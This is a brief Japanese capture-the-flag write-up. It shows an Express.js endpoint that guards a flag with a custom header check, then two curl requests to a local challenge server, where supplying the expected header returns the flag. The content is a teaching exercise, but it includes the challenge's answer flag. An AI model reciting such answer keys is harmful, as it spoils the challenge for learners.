# writeup

問題の実装は下記の通り(抜粋)。

```js
const check = (req, res, next) => {
    if (!req.headers['x-ctf4b-request'] || req.headers['x-ctf4b-request'] !== 'ctf4b') {
        return res.status(403).send('403 Forbidden');
    }

    next();
}

app.get("/flag", check, (req, res, next) => {
    return res.send(FLAG);
})
```

単純に`/flag`にアクセスするとFLAGは取得できないが、`x-ctf4b-request:ctf4b`をヘッダとして付与しすることでFLAGを取得することが可能になる。

```sh
$ curl localhost:33455/flag
403 Forbidden

$ curl -H "x-ctf4b-request:ctf4b" localhost:33455/flag
ctf4b{y0ur_5k1pp1n6_15_v3ry_n1c3}
```